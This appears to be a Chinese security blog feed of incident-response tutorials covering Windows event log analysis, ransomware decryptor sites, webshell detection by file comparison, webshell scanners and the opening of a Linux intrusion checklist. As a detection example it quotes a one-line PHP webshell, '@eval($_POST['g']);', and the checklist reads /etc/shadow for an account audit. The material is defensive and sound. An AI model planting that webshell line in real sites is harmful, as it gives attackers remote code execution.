href="https://support.microsoft.com/zh-cn/help/977519/description-of-security-events-in-windows-7-and-in-windows-server-2008">https://support.microsoft.com/zh-cn/help/977519/description-of-security-events-in-windows-7-and-in-windows-server-2008</a></p></blockquote><p>案例1：可以利用eventlog事件来查看系统账号登录情况：</p><ol><li><p>在<strong>“开始”</strong>菜单上，依次指向<strong>“所有程序”</strong>、<strong>“管理工具”</strong>，然后单击<strong>“事件查看器”</strong>；</p></li><li><p>在事件查看器中，单击<strong>“安全”</strong>，查看安全日志；</p></li><li><p>在安全日志右侧操作中，点击<strong>“筛选当前日志”</strong>，输入事件ID进行筛选。</p><p>4624  –登录成功<br>4625  –登录失败<br>4634 – 注销成功<br>4647 – 用户启动的注销<br>4672 – 使用超级用户（如管理员）进行登录</p></li></ol><p>我们输入事件ID：4625进行日志筛选，发现事件ID：4625，事件数175904，即用户登录失败了175904次，那么这台服务器管理员账号可能遭遇了暴力猜解。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/log-1-4.png"></p><p>案例2：可以利用eventlog事件来查看计算机开关机的记录： </p><p>1、在<strong>“开始”</strong>菜单上，依次指向<strong>“所有程序”</strong>、<strong>“管理工具”</strong>，然后单击<strong>“事件查看器”</strong>；</p><p>2、在事件查看器中，单击<strong>“系统”</strong>，查看系统日志；</p><p>3、在系统日志右侧操作中，点击<strong>“筛选当前日志”</strong>，输入事件ID进行筛选。</p><p>其中事件ID 6006 ID6005、 ID 6009就表示不同状态的机器的情况（开关机）。<br>    6005 信息 EventLog 事件日志服务已启动。(开机)<br>    6006 信息 EventLog 事件日志服务已停止。(关机)<br>    6009 信息 EventLog 按ctrl、alt、delete键(非正常)关机</p><p>我们输入事件ID：6005-6006进行日志筛选，发现了两条在2018/7/6 17:53:51左右的记录，也就是我刚才对系统进行重启的时间。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/log-1-5.png"></p><h3 id="0x04-日志分析工具"><a href="#0x04-日志分析工具" class="headerlink" title="0x04 日志分析工具"></a>0x04 日志分析工具</h3><h4 id="Log-Parser"><a href="#Log-Parser" class="headerlink" title="Log Parser"></a>Log Parser</h4><p>Log Parser（是微软公司出品的日志分析工具，它功能强大，使用简单，可以分析基于文本的日志文件、XML 文件、CSV（逗号分隔符）文件，以及操作系统的事件日志、注册表、文件系统、Active Directory。它可以像使用 SQL 语句一样查询分析这些数据，甚至可以把分析结果以各种图表的形式展现出来。</p><p>Log Parser 2.2下载地址：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">https://www.microsoft.com/en-us/download/details.aspx?id=24659</a></p><p>Log Parser 使用示例：<a href="https://mlichtenberg.wordpress.com/2011/02/03/log-parser-rocks-more-than-50-examples/">https://mlichtenberg.wordpress.com/2011/02/03/log-parser-rocks-more-than-50-examples/</a></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/log-1-6.png"></p><p><strong>基本查询结构</strong> </p><pre class="line-numbers language-none"><code class="language-none">Logparser.exe –i:EVT –o:DATAGRID "SELECT * FROM c:\xx.evtx"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>使用Log Parser分析日志</strong></p><p>1、查询登录成功的事件</p><pre class="line-numbers language-none"><code class="language-none">登录成功的所有事件LogParser.exe -i:EVT –o:DATAGRID  "SELECT *  FROM c:\Security.evtx where EventID=4624"指定登录时间范围的事件：LogParser.exe -i:EVT –o:DATAGRID  "SELECT *  FROM c:\Security.evtx where TimeGenerated&gt;'2018-06-19 23:32:11' and TimeGenerated&lt;'2018-06-20 23:34:00' and EventID=4624"提取登录成功的用户名和IP：LogParser.exe -i:EVT  –o:DATAGRID  "SELECT EXTRACT_TOKEN(Message,13,' ') as EventType,TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,'|') as Username,EXTRACT_TOKEN(Message,38,' ') as Loginip FROM c:\Security.evtx where EventID=4624"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 2、查询登录失败的事件</p><pre class="line-numbers language-none"><code class="language-none">登录失败的所有事件：LogParser.exe -i:EVT –o:DATAGRID  "SELECT *  FROM c:\Security.evtx where EventID=4625"提取登录失败用户名进行聚合统计：LogParser.exe  -i:EVT "SELECT  EXTRACT_TOKEN(Message,13,' ')  as EventType,EXTRACT_TOKEN(Message,19,' ') as user,count(EXTRACT_TOKEN(Message,19,' ')) as Times,EXTRACT_TOKEN(Message,39,' ') as Loginip FROM c:\Security.evtx where EventID=4625 GROUP BY Message" <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3、系统历史开关机记录：</p><pre class="line-numbers language-none"><code class="language-none">LogParser.exe -i:EVT –o:DATAGRID  "SELECT TimeGenerated,EventID,Message FROM c:\System.evtx where EventID=6005 or EventID=6006"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="LogParser-Lizard"><a href="#LogParser-Lizard" class="headerlink" title="LogParser Lizard"></a>LogParser Lizard</h4><p>对于GUI环境的Log Parser Lizard，其特点是比较易于使用，甚至不需要记忆繁琐的命令，只需要做好设置，写好基本的SQL语句，就可以直观的得到结果。</p><p>下载地址：<a href="http://www.lizard-labs.com/log_parser_lizard.aspx">http://www.lizard-labs.com/log_parser_lizard.aspx</a></p><p>依赖包：Microsoft .NET Framework 4 .5，下载地址：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=42642">https://www.microsoft.com/en-us/download/details.aspx?id=42642</a></p><p>查询最近用户登录情况：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/log-1-7.png"></p><h4 id="Event-Log-Explorer"><a href="#Event-Log-Explorer" class="headerlink" title="Event Log Explorer"></a>Event Log Explorer</h4><p>Event Log Explorer是一款非常好用的Windows日志分析工具。可用于查看，监视和分析跟事件记录，包括安全，系统，应用程序和其他微软Windows 的记录被记载的事件，其强大的过滤功能可以快速的过滤出有价值的信息。</p><p>下载地址：<a href="https://event-log-explorer.en.softonic.com/">https://event-log-explorer.en.softonic.com/</a></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/log-1-8.png"></p><p>参考链接：</p><p>Windows日志分析   <a href="https://mp.weixin.qq.com/s/ige5UO8WTuOOO3yRw-LeqQ">https://mp.weixin.qq.com/s/ige5UO8WTuOOO3yRw-LeqQ</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="日志分析" scheme="http://www.xiaocaibi.top/tags/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>第5篇：勒索病毒自救指南</title>
    <link href="http://www.xiaocaibi.top/posts/5decabe4.html"/>
    <id>http://www.xiaocaibi.top/posts/5decabe4.html</id>
    <published>2021-07-21T01:11:02.000Z</published>
    <updated>2021-09-20T08:47:43.869Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="第5篇：勒索病毒自救指南"><a href="#第5篇：勒索病毒自救指南" class="headerlink" title="第5篇：勒索病毒自救指南"></a>第5篇：勒索病毒自救指南</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>经常会有一些小伙伴问：中了勒索病毒，该怎么办，可以解密吗？</p><p>第一次遇到勒索病毒是在早几年的时候，客户因网站访问异常，进而远程协助进行排查。登录服务器，在站点目录下发现所有的脚本文件及附件后缀名被篡改，每个文件夹下都有一个文件打开后显示勒索提示信息，这便是勒索病毒的特征。</p><p>出于职业习惯，我打包了部分加密文件样本和勒索病毒提示信息用于留档，就在今天，我又重新上传了样本，至今依然无法解密。</p><p>作为一个安全工程师，而非一个专业的病毒分析师，我们可以借助各大安全公司的能力，寻找勒索病毒的解密工具。</p><p>本文整理了一份勒索病毒自救指南，通过勒索病毒索引引擎查找勒索病毒相关信息，再通过各个安全公司提供的免费勒索软件解密工具解密。当然，能否解密全凭运气，so，平时还是勤打补丁多备份。</p><p><strong>一、勒索病毒搜索引擎</strong></p><p>在勒索病毒搜索引擎输入病毒名、勒索邮箱、被加密后文件的后缀名，或直接上传被加密文件、勒索提示信息，即可可快速查找到病毒详情和解密工具。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20200406-1.png"></p><p>这些网站的解密能力还在持续更新中，是值得收藏的几个勒索病毒工具型网站。</p><p>【360】 勒索病毒搜索引擎，支持检索超过800种常见勒索病毒</p><p>官网：<a href="http://lesuobingdu.360.cn/">http://lesuobingdu.360.cn</a></p><p>【腾讯】 勒索病毒搜索引擎，支持检索超过 300 种常见勒索病毒</p><p>官网：<a href="https://guanjia.qq.com/pr/ls">https://guanjia.qq.com/pr/ls</a></p><p>【启明】VenusEye勒索病毒搜索引擎，超300种勒索病毒家族</p><p>官网：<a href="https://lesuo.venuseye.com.cn/">https://lesuo.venuseye.com.cn</a></p><p>【奇安信】勒索病毒搜索引擎</p><p>官网：<a href="https://lesuobingdu.qianxin.com/">https://lesuobingdu.qianxin.com</a></p><p>【深信服】勒索病毒搜索引擎</p><p>官网：<a href="https://edr.sangfor.com.cn/#/information/ransom_search">https://edr.sangfor.com.cn/#/information/ransom_search</a></p><hr><p><strong>二、勒索软件解密工具集</strong></p><p>很多安全公司都提供了免费的勒索病毒解密工具下载，收集和整理相关下载地址，可以帮助我们了解和获取最新的勒索病毒解密工具。</p><p>【腾讯哈勃】勒索软件专杀工具</p><p>官网：<a href="https://habo.qq.com/tool">https://habo.qq.com/tool</a></p><p>【金山毒霸】勒索病毒免疫工具</p><p>官网：<a href="http://www.duba.net/dbt/wannacry.html">http://www.duba.net/dbt/wannacry.html</a></p><p>【火绒】安全工具下载</p><p>官网：<a href="http://bbs.huorong.cn/forum-55-1.html">http://bbs.huorong.cn/forum-55-1.html</a></p><p>【瑞星】解密工具下载</p><p>官网：<a href="http://it.rising.com.cn/fanglesuo/index.html">http://it.rising.com.cn/fanglesuo/index.html</a></p><p>【nomoreransom】勒索软件解密工具集</p><p>官网：<a href="https://www.nomoreransom.org/zh/index.html">https://www.nomoreransom.org/zh/index.html</a></p><p>【MalwareHunterTeam】勒索软件解密工具集</p><p>官网：<a href="https://id-ransomware.malwarehunterteam.com/">https://id-ransomware.malwarehunterteam.com</a></p><p>【卡巴斯基】免费勒索解密器</p><p>官网：<a href="https://noransom.kaspersky.com/">https://noransom.kaspersky.com</a></p><p>【Avast】免费勒索软件解密工具</p><p>官网：<a href="https://www.avast.com/zh-cn/ransomware-decryption-tools">https://www.avast.com/zh-cn/ransomware-decryption-tools</a></p><p>【Emsisoft】免费勒索软件解密工具</p><p>官网：<a href="https://www.emsisoft.com/ransomware-decryption-tools/free-download">https://www.emsisoft.com/ransomware-decryption-tools/free-download</a></p><p>【GitHub 项目】勒索病毒解密工具收集汇总</p><p>官网：<a href="https://github.com/jiansiting/Decryption-Tools">https://github.com/jiansiting/Decryption-Tools</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="入侵排查篇" scheme="http://www.xiaocaibi.top/tags/%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/"/>
    
  </entry>
  
  <entry>
    <title>第4篇：如何发现隐藏的 Webshell 后门</title>
    <link href="http://www.xiaocaibi.top/posts/5e1c01b0.html"/>
    <id>http://www.xiaocaibi.top/posts/5e1c01b0.html</id>
    <published>2021-07-20T00:11:46.000Z</published>
    <updated>2021-09-20T08:47:43.869Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="第4篇：如何发现隐藏的-Webshell-后门"><a href="#第4篇：如何发现隐藏的-Webshell-后门" class="headerlink" title="第4篇：如何发现隐藏的 Webshell 后门"></a>第4篇：如何发现隐藏的 Webshell 后门</h2><h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>如何在百万行代码里发现隐藏的后门？</p><p>试想一下，如果你的网站被入侵，攻击者留下隐藏的后门，你真的都可以找出来吗？面对一个大中型的应用系统，数以百万级的代码行，是不可能做到每个文件每段代码进行手工检查的。</p><p>即使是一款拥有 99.9% 的 Webshell 检出率的检测引擎，依然可能存在 Webshell 绕过的情况。另外，像暗链、网页劫持、页面跳转等常见的黑帽 SEO 手法，也很难通过手动检测或工具检测全部识别出来。</p><p>最好的方式就是做文件完整性验证。通过与原始代码对比，可以快速发现文件是否被篡改以及被篡改的位置。当然，第一个前提是，你所在的团队已具备代码版本管理的能力，如果你是个人站长，相信你已经备份了原始代码。</p><p>本文将结合实际应用，介绍几种文件完整性验证方式，可以帮助你找出代码中所有隐藏的后门。</p><hr><p><strong>1、文件 MD5 校验</strong></p><p>下载D盾_Web查杀工具的时候，我们可以留意到下载的压缩包里，除了有一个 exe 可执行文件，还有一个文件 md5 值。这个是软件作者在发布软件时，通过 md5 算法计算出该 exe 文件的”特征值”。</p><pre class="line-numbers language-none"><code class="language-none">下载地址：http://www.d99net.net/down/WebShellKill_V2.0.9.zip文件 MD5：29285decadbce3918a4f8429ec33df46   WebShellKill.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>当用户下载软件时，可以使用相同的校验算法计算下载到 exe 文件的特征值，并与软件开发者发布的特征值比较。如果两个特征值相同，则认为下载到的 exe 文件是正确的。如果两个特征值不同，则认为下载到 exe 文件是被篡改过的。</p><p>那同理可得，我们可以将所有网站文件计算一次 hash 值保存，当出现应急情况时，重新计算一次 hash 值，并与上次保存的 hash 值进行对比，从而输出新创建的、修改过及删除的文件列表。</p><p>文件 hash 值计算：</p><pre class="line-numbers language-none"><code class="language-none">def md5sum(file):    m=hashlib.md5()    if os.path.isfile(file):        f=open(file,'rb')        for line in f:            m.update(line)        f.close    else:        m.update(file)    return (m.hexdigest())<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对文件进行哈希值重新计算，进行校验对比，测试效果：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20200411-1.png"></p><p>如上图，在上传目录新增了一个 evil.php 文件，还有一个被篡改的文件是 low.php 。使用常见的编辑器 Notepad++ 进行对比，可以发现 low.php 文件里被插入了一句话 WebShell。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20200411-2.png"></p><p><strong>2、diff 命令</strong></p><p>在 Linux 中，我们经常使用 diff 命令来比较两个文本文件的差异。同样，我们可以通过一行命令快速找出两个项目文件的差异。</p><pre class="line-numbers language-none"><code class="language-none">diff -c -a -r cms1 cms2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图所示，前三行列出了两个要对比的文件目录的差异，可以发现 low.php 文件被篡改过，篡改的内容是 <code>@eval($_POST['g']);</code></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20200411-3.png"></p><p>备注：如果只是想查看两个文件是否不同又不想显示差异之处的话，可以加上 -q 选项。</p><p><strong>3、版本控制工具</strong></p><p>版本控制工具，比如说 git，重新上传代码到 git，add+commit+push，然后打开项目，点击 commits，在历史提交版本里面，查看文件更改内容，很容易就可以发现代码被篡改的地方了。</p><p>另外，也可以通过 git diff 用来比较文件之间的不同。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20200411-4.png"></p><p><strong>4、文件对比工具</strong></p><p>关键词：代码对比工具，你会找到很多好用的工具，这里我们推荐两款效果还不错的工具，Beyond Compare 和 WinMerge。</p><p><strong>Beyond Compare</strong></p><p>Beyond Compare 是一套由 Scooter Software 推出的文件比较工具。主要用途是对比两个文件夹或者文件，并将差异以颜色标示，比较范围包括目录，文档内容等。</p><p>下载地址：<a href="http://www.scootersoftware.com/download.php">http://www.scootersoftware.com/download.php</a></p><p>软件使用示例，通过文件夹比较，找出文件夹中的差异内容。</p><p>1、双击 Beyond Compare ，打开软件主页，选择文件夹比较。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20200411-5.png"></p><p>2、在双边栏输入文件夹路径，点击显示差别，列出差异部分的内容，紫色部分为新增文件，红色部分为篡改文件。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20200411-6.png"></p><p>3、双击具体文件，进入代码对比，找到代码差异部分。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20200411-7.png"></p><p><strong>WinMerge</strong></p><p>WinMerge 是一款运行于 Windows 系统下的文件比较和合并工具，使用它可以非常方便地比较文件夹和文件，以易于理解的可视文本格式显示差异。</p><p>下载地址：<a href="https://winmerge.org/downloads/">https://winmerge.org/downloads/</a></p><p>1、文件 – 打开，选择文件或文件夹，然后点击进行比较。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20200411-8.png"></p><p>2、在同一个界面里，通过颜色和文本提示，显示文件夹内容差异。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20200411-9.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="入侵排查篇" scheme="http://www.xiaocaibi.top/tags/%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/"/>
    
  </entry>
  
  <entry>
    <title>第3篇：常见的 Webshell 查杀工具</title>
    <link href="http://www.xiaocaibi.top/posts/b5751651.html"/>
    <id>http://www.xiaocaibi.top/posts/b5751651.html</id>
    <published>2021-07-18T06:30:26.000Z</published>
    <updated>2021-09-20T08:47:43.854Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="第3篇：常见的-Webshell-查杀工具"><a href="#第3篇：常见的-Webshell-查杀工具" class="headerlink" title="第3篇：常见的 Webshell 查杀工具"></a>第3篇：常见的 Webshell 查杀工具</h1><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>当网站服务器被入侵时，我们需要一款Webshell检测工具，来帮助我们发现webshell，进一步排查系统可能存在的安全漏洞。</p><p>本文推荐了10款 WebShll 检测工具，用于网站入侵排查。当然，目前市场上的很多主机安全产品也都提供这种 WebShell 检测能力，比如阿里云、青藤云、safedog 等，本文暂不讨论。</p><hr><p><strong>1、D盾_Web查杀</strong></p><p>阿D出品，使用自行研发不分扩展名的代码分析引擎，能分析更为隐藏的 WebShell 后门行为。</p><p>兼容性：只提供 Windows 版本。</p><p>工具下载地址：<a href="http://www.d99net.net/">http://www.d99net.net</a></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20200407-1111.png"></p><p><strong>2、百度 WEBDIR+</strong></p><p>下一代 WebShell 检测引擎，采用先进的动态监测技术，结合多种引擎零规则查杀。</p><p>兼容性：提供在线查杀木马，免费开放 API 支持批量检测。</p><p>在线查杀地址：<a href="https://scanner.baidu.com/">https://scanner.baidu.com</a></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20200407-2222.png"></p><p><strong>3、河马</strong></p><p>专注 WebShell 查杀研究，拥有海量 WebShell 样本和自主查杀技术，采用传统特征+云端大数据双引擎的查杀技术。查杀速度快、精度高、误报低。</p><p>兼容性：支持 Windows、Linux，支持在线查杀。</p><p>官方网站：<a href="https://www.shellpub.com/">https://www.shellpub.com</a></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20200407-3.png"></p><p><strong>4、Web Shell Detector</strong></p><p>Web Shell Detector 具有 WebShell 签名数据库，可帮助识别高达 99％ 的 WebShell。</p><p>兼容性：提供 PHP、Python 脚本，可跨平台，在线检测。</p><p>官方网站：<a href="http://www.shelldetector.com/">http://www.shelldetector.com</a></p><p>github项目地址：<a href="https://github.com/emposha/PHP-Shell-Detector">https://github.com/emposha/PHP-Shell-Detector</a></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20200407-4.png"></p><p><strong>5、CloudWalker（牧云）</strong></p><p>一个可执行的命令行版本 Webshell 检测工具。目前，项目已停止更新。</p><p>兼容性：提供 Linux版本，Windows 暂不支持。</p><p>在线查杀 demo：<a href="https://webshellchop.chaitin.cn/">https://webshellchop.chaitin.cn</a></p><p>GitHub 项目地址：<a href="https://github.com/chaitin/cloudwalker">https://github.com/chaitin/cloudwalker</a></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20200407-5.png"></p><p><strong>6、Sangfor WebShellKill</strong></p><p>Sangfor WebShellKill (网站后门检测工具)是一款 Web 后门专杀工具，不仅支持 WebShell 的扫描，同时还支持暗链的扫描。是一款融合了多重检测引擎的查杀工具。能更精准地检测出WEB网站已知和未知的后门文件。</p><p>兼容性：支持 Windows、linux</p><p>工具下载地址：<a href="http://edr.sangfor.com.cn/backdoor_detection.html%EF%BC%88%E5%B7%B2%E5%81%9C%E6%AD%A2%E8%AE%BF%E9%97%AE%EF%BC%89">http://edr.sangfor.com.cn/backdoor_detection.html（已停止访问）</a></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20200407-6.png"></p><p><strong>7、深度学习模型检测 PHP Webshell</strong></p><p>一个深度学习 PHP WebShell 查杀引擎 demo，提供在线样本检测。</p><p>在线查杀地址：<a href="http://webshell.cdxy.me/">http://webshell.cdxy.me</a></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20200407-7.png"></p><p><strong>8、PHP Malware Finder</strong></p><p>PHP-malware-finder 是一款优秀的检测webshell和恶意软件混淆代码的工具</p><p>兼容性：提供Linux 版本，Windows 暂不支持。</p><p>GitHub 项目地址：<a href="https://github.com/jvoisin/php-malware-finder">https://github.com/jvoisin/php-malware-finder</a></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20200407-8.png"></p><p><strong>9、findWebshell</strong></p><p>这个项目是一款基于 Python 开发的 WebShell 检查工具，可以根据特征码匹配检查任意类型的 WebShell 后门。</p><p>GitHub 项目地址：<a href="https://github.com/he1m4n6a/findWebshell">https://github.com/he1m4n6a/findWebshell</a></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20200407-9.png"></p><p><strong>10、在线 WebShell 查杀工具</strong></p><p>在线查杀地址：<a href="http://tools.bugscaner.com/killwebshell">http://tools.bugscaner.com/killwebshell</a></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20200407-10.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="入侵排查篇" scheme="http://www.xiaocaibi.top/tags/%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/"/>
    
  </entry>
  
  <entry>
    <title>第2篇：Linux 入侵排查</title>
    <link href="http://www.xiaocaibi.top/posts/9d9648b3.html"/>
    <id>http://www.xiaocaibi.top/posts/9d9648b3.html</id>
    <published>2021-07-16T02:10:16.000Z</published>
    <updated>2021-09-20T08:47:43.822Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="第2篇：Linux-入侵排查"><a href="#第2篇：Linux-入侵排查" class="headerlink" title="第2篇：Linux 入侵排查"></a>第2篇：Linux 入侵排查</h2><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。  </p><p>针对常见的攻击事件，结合工作中应急响应事件分析和解决的方法，总结了一些 Linux 服务器入侵排查的思路。</p><h3 id="0x01-入侵排查思路"><a href="#0x01-入侵排查思路" class="headerlink" title="0x01 入侵排查思路"></a>0x01 入侵排查思路</h3><h4 id="1-1-账号安全"><a href="#1-1-账号安全" class="headerlink" title="1.1 账号安全"></a>1.1 账号安全</h4><p><strong>基本使用：</strong></p><pre class="line-numbers language-none"><code class="language-none">1、用户信息文件 /etc/passwdroot:x:0:0:root:/root:/bin/bashaccount:password:UID:GID:GECOS:directory:shell用户名：密码：用户ID：组ID：用户说明：家目录：登陆之后的 shell注意：无密码只允许本机登陆，远程不允许登陆2、影子文件 /etc/shadowroot:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7:::用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">who     查看当前登录用户（tty 本地登陆  pts 远程登录）w       查看系统信息，想知道某一时刻用户的行为uptime  查看登陆多久、多少用户，负载状态<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>入侵排查：</strong></p><pre class="line-numbers language-none"><code class="language-none">1、查询特权用户特权用户(uid 为0)[root@localhost ~]# awk -F: '$3==0{print $1}' /etc/passwd2、查询可以远程登录的帐号信息[root@localhost ~]# awk '/\$1|\$6/{print $1}' /etc/shadow3、除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限[root@localhost ~]# more /etc/sudoers | grep -v "^#\|^$" | grep "ALL=(ALL)"4、禁用或删除多余及可疑的帐号    usermod -L user    禁用帐号，帐号无法登录，/etc/shadow 第二栏为 ! 开头userdel user       删除 user 用户userdel 